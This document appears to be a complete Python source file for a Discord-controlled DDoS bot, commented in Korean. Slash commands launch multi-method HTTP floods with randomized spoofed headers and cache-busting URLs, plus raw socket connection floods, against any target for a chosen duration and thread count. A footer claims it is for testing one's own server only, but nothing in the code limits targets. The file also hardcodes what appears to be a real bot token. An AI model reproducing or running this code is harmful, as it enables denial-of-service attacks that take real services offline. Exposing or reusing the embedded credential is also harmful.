#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess

def install_modules():
    """필요한 모듈 자동 설치"""
    required = ['discord.py', 'aiohttp', 'asyncio', 'random', 'time', 'threading', 'socket', 'ssl', 'urllib3']
    for module in ['discord.py', 'aiohttp']:
        try:
            __import__(module.replace('.py', ''))
        except ImportError:
            print(f"[*] Installing {module}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', module])

install_modules()

import discord
import asyncio
import aiohttp
import random
import time
import socket
import ssl
import threading
from urllib.parse import urlparse

# ==================== 설정 ====================
TOKEN = "MTQ5NjQ1MzY5NDYwNTA5OTE4OA.G-Gm6K._PhO4109QXNi6zEDj8A7YEjRFMwJT5W8LtCeAw"
ALLOWED_USERS = [1465353827363590350]  # 네 디스코드 ID로 변경

intents = discord.Intents.default()
bot = discord.Bot(intents=intents)

attacks = {}

# ==================== HTTP 헤더 랜덤 생성 ====================
def random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'ko-KR,ko;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Referer': f"http://{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}/",
    }

# ==================== HTTP 플러드 (멀티 메서드) ====================
methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']

async def http_flood_worker(session, url, stop_event, method=None):
    if method is None:
        method = random.choice(methods)
    while not stop_event.is_set():
        try:
            rand_url = url + ('&' if '?' in url else '?') + f'_{random.random()}_{int(time.time()*1000)}'
            headers = random_headers()
            async with session.request(method, rand_url, headers=headers, timeout=2) as resp:
                await resp.read()
        except:
            await asyncio.sleep(0.001)

# ==================== RAW 소켓 플러드 (더티 패킷) ====================
def raw_socket_flood(target_host, target_port, stop_event):
    """저수준 소켓 플러드 - 화력 증폭"""
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_host, target_port))
            
            # 랜덤 HTTP 요청 생성
            request = f"GET /?_{random.random()} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random_headers()['User-Agent']}\r\nX-Forwarded-For: {random_headers()['X-Forwarded-For']}\r\nConnection: close\r\n\r\n"
            sock.send(request.encode())
            sock.close()
        except:
            pass
        time.sleep(0.001)

# ==================== 메인 공격 엔진 ====================
async def run_attack(target, duration, threads, attack_id, use_socket=True):
    if not target.startswith('http'):
        target = 'http://' + target
    
    # URL 파싱 (소켓 공격용)
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_ssl = parsed.scheme == 'https'
    
    connector = aiohttp.TCPConnector(limit=threads, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        stop_event = asyncio.Event()
        
        # HTTP 플러드 태스크
        http_tasks = [asyncio.create_task(http_flood_worker(session, target, stop_event)) for _ in range(threads)]
        
        # 소켓 플러드 스레드 (추가 화력)
        socket_stop_event = threading.Event()
        socket_threads = []
        if use_socket:
            for _ in range(threads // 2):
                t = threading.Thread(target=raw_socket_flood, args=(host, port, socket_stop_event))
                t.start()
                socket_threads.append(t)
        
        # duration 초 동안 실행
        await asyncio.sleep(duration)
        stop_event.set()
        socket_stop_event.set()
        
        await asyncio.gather(*http_tasks, return_exceptions=True)
        for t in socket_threads:
            t.join(timeout=1)
        
        if attack_id in attacks:
            attacks[attack_id]['active'] = False

# ==================== 디스코드 명령어 ====================
@bot.slash_command(name="ddos", description="💣 DDoS 공격 실행 (멀티 메서드 + 소켓)")
async def ddos(ctx, target: str, duration: int = 30, threads: int = 500, use_socket: bool = True):
    if ctx.author.id not in ALLOWED_USERS:
        await ctx.respond("❌ 권한 없음", ephemeral=True)
        return
    
    attack_id = f"{ctx.author.id}_{int(time.time())}"
    attacks[attack_id] = {
        'active': True,
        'target': target,
        'started_at': time.time()
    }
    
    await ctx.respond(f"💣 **공격 시작**\n🎯 타겟: `{target}`\n⏱️ 시간: `{duration}초`\n🧵 쓰레드: `{threads}`\n🔌 소켓모드: `{use_socket}`\n🆔 ID: `{attack_id}`")
    
    asyncio.create_task(run_attack(target, duration, threads, attack_id, use_socket))
    
    await asyncio.sleep(duration)
    if attack_id in attacks and attacks[attack_id]['active']:
        attacks[attack_id]['active'] = False
        await ctx.send(f"✅ 공격 종료: `{target}` - {duration}초 경과")

@bot.slash_command(name="methods", description="📋 사용 가능한 HTTP 메서드 목록")
async def show_methods(ctx):
    if ctx.author.id not in ALLOWED_USERS:
        await ctx.respond("❌ 권한 없음", ephemeral=True)
        return
    await ctx.respond(f"📋 **지원 메서드**: `{', '.join(methods)}` (랜덤 선택)")

@bot.slash_command(name="stop", description="🛑 모든 공격 중지")
async def stop_all(ctx):
    if ctx.author.id not in ALLOWED_USERS:
        await ctx.respond("❌ 권한 없음", ephemeral=True)
        return
    
    active_count = 0
    for aid, info in attacks.items():
        if info['active']:
            info['active'] = False
            active_count += 1
    
    await ctx.respond(f"🛑 **{active_count}개 공격 중지됨**" if active_count else "ℹ️ 진행중인 공격 없음")

@bot.slash_command(name="status", description="📊 현재 공격 현황")
async def status(ctx):
    if ctx.author.id not in ALLOWED_USERS:
        await ctx.respond("❌ 권한 없음", ephemeral=True)
        return
    
    active = [info for info in attacks.values() if info['active']]
    if active:
        msg = f"**진행중인 공격: {len(active)}개**\n"
        for idx, info in enumerate(active, 1):
            elapsed = int(time.time() - info['started_at'])
            msg += f"{idx}. 🎯 {info['target']} | ⏱️ {elapsed}초\n"
        await ctx.respond(msg)
    else:
        await ctx.respond("ℹ️ 진행중인 공격 없음")

@bot.slash_command(name="help", description="📖 명령어 도움말")
async def help_cmd(ctx):
    if ctx.author.id not in ALLOWED_USERS:
        await ctx.respond("❌ 권한 없음", ephemeral=True)
        return
    
    embed = discord.Embed(title="💀 DDoS Panel Bot v3.0", color=0xff0000)
    embed.add_field(name="/ddos [target] [duration] [threads] [use_socket]", 
                    value="예: `/ddos http://1.2.3.4 30 1000 true`\n- target: IP 또는 도메인\n- duration: 초\n- threads: 동시 쓰레드\n- use_socket: true/false", inline=False)
    embed.add_field(name="/methods", value="지원 HTTP 메서드 확인", inline=True)
    embed.add_field(name="/stop", value="모든 공격 중지", inline=True)
    embed.add_field(name="/status", value="현황 확인", inline=True)
    embed.set_footer(text="⚠️ 본인 서버 테스트 전용 | HTTP + Socket 하이브리드")
    await ctx.respond(embed=embed)

print("🔥 DDoS Panel Bot 실행 중...")
print(f"지원 메서드: {methods}")
bot.run(TOKEN)
